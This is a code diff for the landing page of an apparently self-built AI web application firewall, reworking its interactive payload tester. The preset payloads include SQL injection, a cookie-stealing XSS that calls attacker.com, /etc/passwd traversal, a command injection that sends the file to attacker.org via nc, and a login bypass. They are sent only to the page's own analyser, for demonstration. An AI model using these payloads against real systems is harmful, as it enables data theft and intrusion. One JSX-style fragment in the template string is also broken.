@@ -150,51 +150,93 @@
             </div>
         </div>
 
-        <!-- Live Interception Interactive Tester -->
-        <div class="glass-card rounded-3xl p-8 shadow-2xl space-y-6">
-            <div class="flex items-center justify-between border-b border-white/10 pb-6">
+        <!-- Elaborate Live Threat Interception Tester -->
+        <div class="glass-card rounded-3xl p-8 shadow-2xl space-y-8">
+            <div class="flex flex-wrap items-center justify-between border-b border-white/10 pb-6 gap-4">
                 <div>
                     <h3 class="text-2xl font-black text-white flex items-center gap-3">
-                        <i class="fas fa-bolt text-brand-500"></i> Live Attack Interception Test Station
+                        <i class="fas fa-microchip text-brand-500"></i> Interactive Threat Interception Workstation
                     </h3>
-                    <p class="text-xs text-slate-400 mt-1">Test live exploit payloads directly against the active Azure WAF API backend</p>
+                    <p class="text-xs text-slate-400 mt-1">Select an exploit vector or synthesize custom HTTP payloads to test live against WireFall Azure WAF</p>
                 </div>
-                <span class="px-3.5 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold flex items-center gap-2 font-mono">
-                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Azure VM (20.196.201.53) ONLINE
-                </span>
+                <div class="flex items-center gap-3">
+                    <span class="px-3.5 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold flex items-center gap-2 font-mono">
+                        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Azure WAF (20.196.201.53) ACTIVE
+                    </span>
+                </div>
             </div>
 
-            <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
-                <button onclick="testPayload('query=wireless+headphones', 'Benign Request')" class="p-5 rounded-2xl bg-cyber-card hover:bg-emerald-500/10 border border-white/10 hover:border-emerald-500/40 text-left transition-all group">
-                    <div class="text-xs font-bold text-emerald-400 flex items-center gap-2 mb-2">
-                        <i class="fas fa-check-circle"></i> Benign Query
+            <!-- Attack Presets Grid -->
+            <div class="grid grid-cols-2 md:grid-cols-6 gap-3">
+                <button onclick="testPreset('sqli')" class="p-4 rounded-2xl bg-cyber-card hover:bg-rose-500/10 border border-white/10 hover:border-rose-500/40 text-left transition-all group">
+                    <div class="text-xs font-bold text-rose-400 flex items-center gap-1.5 mb-1">
+                        <i class="fas fa-database"></i> SQLi Attack
                     </div>
-                    <div class="text-[11px] font-mono text-slate-400 truncate">query=wireless+headphones</div>
+                    <div class="text-[10px] font-mono text-slate-500 truncate">admin' UNION SELECT...</div>
                 </button>
 
-                <button onclick="testPayload('query=admin\' UNION SELECT 1, username, password FROM users--', 'SQL Injection')" class="p-5 rounded-2xl bg-cyber-card hover:bg-rose-500/10 border border-white/10 hover:border-rose-500/40 text-left transition-all group">
-                    <div class="text-xs font-bold text-rose-400 flex items-center gap-2 mb-2">
-                        <i class="fas fa-database"></i> SQL Injection
+                <button onclick="testPreset('xss')" class="p-4 rounded-2xl bg-cyber-card hover:bg-amber-500/10 border border-white/10 hover:border-amber-500/40 text-left transition-all group">
+                    <div class="text-xs font-bold text-amber-400 flex items-center gap-1.5 mb-1">
+                        <i class="fas fa-code"></i> XSS Script
                     </div>
-                    <div class="text-[11px] font-mono text-slate-400 truncate">admin' UNION SELECT...</div>
+                    <div class="text-[10px] font-mono text-slate-500 truncate">&lt;script&gt;fetch(...)</div>
                 </button>
 
-                <button onclick="testPayload('comment=<script>fetch(\'http://attacker.com/steal\')</script>', 'XSS Payload')" class="p-5 rounded-2xl bg-cyber-card hover:bg-amber-500/10 border border-white/10 hover:border-amber-500/40 text-left transition-all group">
-                    <div class="text-xs font-bold text-amber-400 flex items-center gap-2 mb-2">
-                        <i class="fas fa-code"></i> XSS Payload
+                <button onclick="testPreset('traversal')" class="p-4 rounded-2xl bg-cyber-card hover:bg-yellow-500/10 border border-white/10 hover:border-yellow-500/40 text-left transition-all group">
+                    <div class="text-xs font-bold text-yellow-400 flex items-center gap-1.5 mb-1">
+                        <i class="fas fa-folder-open"></i> LFI Traversal
                     </div>
-                    <div class="text-[11px] font-mono text-slate-400 truncate">&lt;script&gt;fetch(...)&lt;/script&gt;</div>
+                    <div class="text-[10px] font-mono text-slate-500 truncate">../../../../etc/passwd</div>
                 </button>
 
-                <button onclick="testPayload('target=127.0.0.1; cat /etc/passwd | nc attacker.org 1337', 'Command RCE')" class="p-5 rounded-2xl bg-cyber-card hover:bg-purple-500/10 border border-white/10 hover:border-purple-500/40 text-left transition-all group">
-                    <div class="text-xs font-bold text-purple-400 flex items-center gap-2 mb-2">
+                <button onclick="testPreset('rce')" class="p-4 rounded-2xl bg-cyber-card hover:bg-purple-500/10 border border-white/10 hover:border-purple-500/40 text-left transition-all group">
+                    <div class="text-xs font-bold text-purple-400 flex items-center gap-1.5 mb-1">
                         <i class="fas fa-terminal"></i> Command RCE
                     </div>
-                    <div class="text-[11px] font-mono text-slate-400 truncate">; cat /etc/passwd...</div>
+                    <div class="text-[10px] font-mono text-slate-500 truncate">; cat /etc/passwd...</div>
+                </button>
+
+                <button onclick="testPreset('bot')" class="p-4 rounded-2xl bg-cyber-card hover:bg-blue-500/10 border border-white/10 hover:border-blue-500/40 text-left transition-all group">
+                    <div class="text-xs font-bold text-blue-400 flex items-center gap-1.5 mb-1">
+                        <i class="fas fa-robot"></i> Bot Brute
+                    </div>
+                    <div class="text-[10px] font-mono text-slate-500 truncate">user=admin&pass=' OR '1</div>
+                </button>
+
+                <button onclick="testPreset('benign')" class="p-4 rounded-2xl bg-cyber-card hover:bg-emerald-500/10 border border-white/10 hover:border-emerald-500/40 text-left transition-all group">
+                    <div class="text-xs font-bold text-emerald-400 flex items-center gap-1.5 mb-1">
+                        <i class="fas fa-check-circle"></i> Clean Query
+                    </div>
+                    <div class="text-[10px] font-mono text-slate-500 truncate">query=wireless+headphones</div>
                 </button>
             </div>
 
-            <div id="testOutput" class="hidden"></div>
+            <!-- Payload Synthesizer Controls -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 bg-black/40 p-5 rounded-2xl border border-white/10">
+                <div>
+                    <label class="text-[11px] font-bold text-slate-400 uppercase tracking-wider">HTTP Method & Path</label>
+                    <div class="flex gap-2 mt-1.5">
+                        <select id="reqMethod" class="bg-cyber-card border border-white/10 rounded-xl px-3 py-2 text-xs font-mono text-brand-400 font-bold focus:outline-none">
+                            <option value="POST">POST</option>
+                            <option value="GET">GET</option>
+                        </select>
+                        <input type="text" id="reqPath" value="/api/v1/users/search" class="w-full bg-cyber-card border border-white/10 rounded-xl px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-brand-500" />
+                    </div>
+                </div>
+
+                <div class="md:col-span-2">
+                    <label class="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Request Payload / Parameters</label>
+                    <div class="flex gap-2 mt-1.5">
+                        <input type="text" id="reqBody" value="query=admin' UNION SELECT 1, username, password FROM users--" class="w-full bg-cyber-card border border-white/10 rounded-xl px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-brand-500" />
+                        <button onclick="executeCustomPayload()" class="px-5 py-2 rounded-xl bg-brand-500 hover:bg-brand-600 text-white font-extrabold text-xs shadow-lg shadow-brand-500/30 transition-all flex items-center gap-2 flex-shrink-0">
+                            <i class="fas fa-paper-plane"></i> Launch
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Diagnostic Output Inspector -->
+            <div id="demoOutput" class="hidden space-y-4"></div>
         </div>
 
         <!-- 3-Stage Pipeline Flow Visualizer -->
@@ -264,63 +306,6 @@
             </div>
         </div>
 
-        <!-- Enterprise Pricing Matrix -->
-        <div class="space-y-10 text-center">
-            <div class="space-y-3">
-                <span class="text-brand-500 font-bold text-xs uppercase tracking-widest">Flexible Cloud Plans</span>
-                <h2 class="text-4xl font-black text-white">Enterprise Security Pricing</h2>
-            </div>
-
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 text-left">
-                <!-- Developer Plan -->
-                <div class="glass-card p-8 rounded-3xl space-y-6 flex flex-col justify-between">
-                    <div class="space-y-4">
-                        <span class="px-3 py-1 rounded-full bg-slate-800 text-slate-400 text-xs font-bold uppercase">Developer</span>
-                        <div class="text-4xl font-black text-white">$0 <span class="text-sm font-normal text-slate-500">/ mo</span></div>
-                        <p class="text-xs text-slate-400 leading-relaxed">Free tier for development testing and small personal projects.</p>
-                        <ul class="space-y-3 text-xs text-slate-300">
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-emerald-400"></i> Up to 100K Requests / mo</li>
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-emerald-400"></i> Stage 1 Redis Fast-Path</li>
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-emerald-400"></i> Basic Telemetry Logs</li>
-                        </ul>
-                    </div>
-                    <a href="dashboard.html" class="w-full py-3.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-bold text-xs text-center transition-all">Get Started Free</a>
-                </div>
-
-                <!-- Business Pro Plan -->
-                <div class="glass-card p-8 rounded-3xl space-y-6 flex flex-col justify-between border-brand-500/50 shadow-2xl relative overflow-hidden">
-                    <div class="absolute top-4 right-4 px-3 py-1 rounded-full bg-brand-500/20 text-brand-400 text-[10px] font-bold uppercase border border-brand-500/30">Popular</div>
-                    <div class="space-y-4">
-                        <span class="px-3 py-1 rounded-full bg-brand-500/20 text-brand-400 text-xs font-bold uppercase">Business Pro</span>
-                        <div class="text-4xl font-black text-white">$299 <span class="text-sm font-normal text-slate-500">/ mo</span></div>
-                        <p class="text-xs text-slate-400 leading-relaxed">Full autonomous WAF protection for high-traffic SaaS products.</p>
-                        <ul class="space-y-3 text-xs text-slate-300">
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-emerald-400"></i> Up to 10M Requests / mo</li>
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-emerald-400"></i> DistilBERT Transformer ML Engine</li>
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-emerald-400"></i> Qwen2.5 LLM Auto-Rule Generator</li>
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-emerald-400"></i> Real-time WebSocket Telemetry</li>
-                        </ul>
-                    </div>
-                    <a href="dashboard.html" class="w-full py-3.5 rounded-xl bg-gradient-to-r from-brand-500 to-amber-500 text-white font-bold text-xs text-center shadow-lg shadow-brand-500/30 transition-all">Start 14-Day Free Trial</a>
-                </div>
-
-                <!-- Enterprise Plan -->
-                <div class="glass-card p-8 rounded-3xl space-y-6 flex flex-col justify-between">
-                    <div class="space-y-4">
-                        <span class="px-3 py-1 rounded-full bg-purple-500/20 text-purple-400 text-xs font-bold uppercase">Enterprise</span>
-                        <div class="text-4xl font-black text-white">Custom</div>
-                        <p class="text-xs text-slate-400 leading-relaxed">Dedicated cloud infrastructure with custom ML fine-tuning & SLA.</p>
-                        <ul class="space-y-3 text-xs text-slate-300">
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-emerald-400"></i> Unlimited Global Bandwidth</li>
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-emerald-400"></i> Custom Model Fine-Tuning</li>
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-emerald-400"></i> Dedicated SOC Support Analyst</li>
-                        </ul>
-                    </div>
-                    <a href="dashboard.html" class="w-full py-3.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-bold text-xs text-center transition-all">Contact Enterprise Sales</a>
-                </div>
-            </div>
-        </div>
-
     </main>
 
     <footer class="border-t border-white/10 py-10 text-center text-xs text-slate-500 relative z-10">
@@ -329,6 +314,87 @@
 
     <script>
         const API_BASE = window.location.origin;
+
+        const PRESET_PAYLOADS = {
+            sqli: { method: "POST", path: "/api/v1/users/search", body: "query=admin' UNION SELECT 1, username, password FROM users--" },
+            xss: { method: "POST", path: "/comment/submit", body: "comment=<script>fetch('http://attacker.com/steal?c='+document.cookie)<\\/script>" },
+            traversal: { method: "GET", path: "/download?file=../../../../../../etc/passwd", body: "" },
+            rce: { method: "POST", path: "/api/system/ping", body: "target=127.0.0.1; cat /etc/passwd | nc attacker.org 1337" },
+            bot: { method: "POST", path: "/api/v1/login", body: "user=admin&pass=' OR '1'='1" },
+            benign: { method: "GET", path: "/app/search", body: "query=wireless+headphones" }
+        };
+
+        function testPreset(key) {
+            const p = PRESET_PAYLOADS[key];
+            if (!p) return;
+            document.getElementById("reqMethod").value = p.method;
+            document.getElementById("reqPath").value = p.path;
+            document.getElementById("reqBody").value = p.body;
+            executeCustomPayload();
+        }
+
+        async function executeCustomPayload() {
+            const method = document.getElementById("reqMethod").value;
+            const path = document.getElementById("reqPath").value;
+            const body = document.getElementById("reqBody").value;
+            const out = document.getElementById("demoOutput");
+
+            out.classList.remove("hidden");
+            out.innerHTML = `<div class="p-4 rounded-xl bg-brand-500/10 border border-brand-500/30 text-brand-400 font-mono text-xs flex items-center gap-2"><i class="fas fa-spinner fa-spin"></i> Submitting request to WireFall WAF engine...</div>`;
+
+            const startTime = performance.now();
+            try {
+                const res = await fetch(`${API_BASE}/analyze`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ method, path, protocol: 'HTTP/1.1', request_body: body })
+                });
+
+                const data = await res.json();
+                const latency = (performance.now() - startTime).toFixed(1);
+                const isBlocked = !data.allow;
+
+                out.innerHTML = `
+                    <div class="p-6 rounded-2xl border ${isBlocked ? 'bg-rose-950/40 border-rose-500/40 text-rose-200' : 'bg-emerald-950/40 border-emerald-500/40 text-emerald-200'} space-y-4">
+                        <div class="flex flex-wrap items-center justify-between gap-2 border-b border-white/10 pb-4">
+                            <div class="font-extrabold text-base flex items-center gap-2">
+                                <i class="fas ${isBlocked ? 'fa-shield-xmark text-rose-400' : 'fa-circle-check text-emerald-400'} text-lg"></i>
+                                WAF Verdict: <span class="font-mono underline">${isBlocked ? '403 FORBIDDEN (BLOCKED)' : '200 OK (ALLOWED)'}</span>
+                            </div>
+                            <div class="flex items-center gap-2">
+                                <span class="text-[11px] font-mono px-3 py-1 rounded-full bg-black/50 border border-white/10">
+                                    ${data.stage1_fast_path ? '⚡ Stage 1 Redis Fast-Path (<0.8ms)' : '🧠 Stage 2 DistilBERT Transformer'}
+                                </span>
+                                <span class="text-[11px] font-mono px-3 py-1 rounded-full bg-brand-500/20 text-brand-400 border border-brand-500/30">
+                                    ⏱️ ${latency} ms Latency
+                                </span>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
+                            <div class="bg-black/60 p-4 rounded-xl border border-white/10 space-y-2">
+                                <div class="text-slate-400 font-bold uppercase text-[10px] tracking-wider">Engine Diagnostic Specs</div>
+                                <div><span class="text-slate-500">Action:</span> ${data.reason}</div>
+                                <div><span class="text-slate-500">Fast-Path Status:</span> ${data.stage1_fast_path ? 'HIT (O(1) Redis Match)' : 'PASS (Stage 2 ML)'}</div>
+                                <div><span class="text-slate-500">Anomaly Ensemble:</span> ${isBlocked ? (data.stage1_fast_path ? 'Redis Fast-Path Rule' : '3 / 3 Anomaly Votes') : '0 / 3 (Normal)'}</div>
+                            </div>
+
+                            <div class="bg-black/60 p-4 rounded-xl border border-white/10 space-y-2">
+                                <div class="text-slate-400 font-bold uppercase text-[10px] tracking-wider">Auto-Learned Regex Rule</div>
+                                <div class="text-brand-400 font-bold break-all">${data.auto_learned_rule || 'None (Clean Request)'}</div>
+                                {data.auto_learned_rule && (
+                                    <button onclick="navigator.clipboard.writeText('${data.auto_learned_rule}')" class="px-3 py-1 rounded bg-slate-800 hover:bg-slate-700 text-white text-[10px]">
+                                        <i class="fas fa-copy"></i> Copy Regex Rule
+                                    </button>
+                                )}
+                            </div>
+                        </div>
+                    </div>
+                `;
+            } catch (err) {
+                out.innerHTML = `<div class="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-400 font-mono text-xs">Error contacting WAF API: ${err}</div>`;
+            }
+        }
 
         // Matrix rain effect
         const canvas = document.getElementById('matrixCanvas');
@@ -355,48 +421,6 @@
             }
         }
         setInterval(drawMatrix, 50);
-
-        async function testPayload(payload, name) {
-            const out = document.getElementById("testOutput");
-            out.classList.remove("hidden");
-            out.innerHTML = `<div class="p-4 rounded-xl bg-brand-500/10 border border-brand-500/30 text-brand-400 font-mono text-xs"><i class="fas fa-spinner fa-spin mr-2"></i> Analyzing ${name} through Stage 1 Redis & Stage 2 DistilBERT...</div>`;
-
-            try {
-                const res = await fetch(`${API_BASE}/analyze`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        method: 'POST',
-                        path: '/api/v1/search',
-                        protocol: 'HTTP/1.1',
-                        request_body: payload
-                    })
-                });
-
-                const data = await res.json();
-                const isBlocked = !data.allow;
-
-                out.innerHTML = `
-                    <div class="p-6 rounded-2xl border ${isBlocked ? 'bg-rose-950/40 border-rose-500/40 text-rose-200' : 'bg-emerald-950/40 border-emerald-500/40 text-emerald-200'}">
-                        <div class="flex items-center justify-between mb-3">
-                            <div class="font-extrabold text-sm flex items-center gap-2">
-                                <i class="fas ${isBlocked ? 'fa-shield-xmark text-rose-400' : 'fa-circle-check text-emerald-400'} text-base"></i>
-                                ${name} Verdict: <span class="font-mono underline">${isBlocked ? '403 FORBIDDEN (BLOCKED)' : '200 OK (ALLOWED)'}</span>
-                            </div>
-                            <span class="text-[11px] font-mono px-3 py-1 rounded-full bg-black/40 border border-white/10">
-                                ${data.stage1_fast_path ? '⚡ Stage 1 Redis Fast-Path (<1ms)' : '🧠 Stage 2 DistilBERT Transformer'}
-                            </span>
-                        </div>
-                        <div class="text-xs font-mono bg-black/60 p-4 rounded-xl border border-white/10 overflow-x-auto">
-                            <div><span class="text-slate-500">Action:</span> ${data.reason}</div>
-                            ${data.auto_learned_rule ? `<div class="mt-2 text-brand-400"><span class="text-slate-500">LLM Generated Regex:</span> ${data.auto_learned_rule}</div>` : ''}
-                        </div>
-                    </div>
-                `;
-            } catch (err) {
-                out.innerHTML = `<div class="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-400 font-mono text-xs">Error contacting WAF API: ${err}</div>`;
-            }
-        }
     </script>
 </body>
 </html>
